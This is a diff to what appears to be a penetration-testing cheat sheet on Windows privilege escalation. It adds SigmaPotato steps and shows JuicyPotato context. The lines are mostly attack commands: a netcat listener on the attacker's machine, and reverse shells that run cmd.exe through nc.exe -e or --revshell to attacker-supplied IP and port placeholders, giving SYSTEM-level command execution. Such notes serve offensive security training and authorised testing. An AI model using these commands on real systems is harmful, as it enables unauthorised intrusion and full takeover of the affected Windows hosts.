@@ -70,6 +70,23 @@ $ sudo nc -lnvp <Our_Port>
 > c:\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\nc.exe <Our_IP> <Our_Port> -e cmd.exe" -t *
 ````
 
+**SigmaPotato**
+````cmd
+# Step 1: Check privileges
+whoami /priv
+
+# Step 2: Set up netcat listener
+# On attacker machine
+sudo nc -lnvp <Port>
+
+# Step 3: Execute SigmaPotato (RevShell)
+SigmaPotato.exe "C:\Users\Public\nc.exe <IP> <PORT> -e cmd"
+SigmaPotato.exe --revshell <IP> <PORT>
+
+# Execute a Command
+SigmaPotato.exe <command>
+````
+
 **PrintSpoofer & RoguePotato & PrintNightmare**
 ````
 # Method 1 - PrintSpoofer
